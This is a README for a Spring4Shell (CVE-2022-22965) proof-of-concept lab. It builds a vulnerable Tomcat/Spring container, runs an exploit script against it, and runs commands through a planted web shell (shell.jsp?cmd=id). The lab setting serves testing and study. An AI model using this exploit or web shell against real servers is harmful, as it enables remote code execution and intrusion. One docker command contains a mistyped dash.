# Spring4Shell
Spring4Shell (CVE-2022-22965) Proof Of Concept with a vulnerable Tomcat server with a vulnerable spring4shell application.


## Details about this vulnerability
- [https://websecured.io/blog/624411cf775ad17d72274d16/spring4shell-poc](https://websecured.io/blog/624411cf775ad17d72274d16/spring4shell-poc)
- [https://www.springcloud.io/post/2022-03/spring-0day-vulnerability](https://www.springcloud.io/post/2022-03/spring-0day-vulnerability)
- [https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)

# How to use
## Build the image
```bash
docker build . -t spring4shell
```

## Run the container
```bash
docker run -p 80:8080 spring4shell
```
You can also run it with the debugger port exposed if needed:
```bash
docker run -p 80:8080 –p 5005:5005 spring4shell
```
See the original blog post for the details of setting up a remote debugger in IntelliJ Idea!

## Run the exploit
```bash
./exploit.sh --url http://localhost/spring4shell/hello --dir spring4shell
```

Then, you can run any command remotely like this:
```bash
curl http://localhost/spring4shell/shell.jsp?cmd=id --output -
```
...or by visiting the URL above.

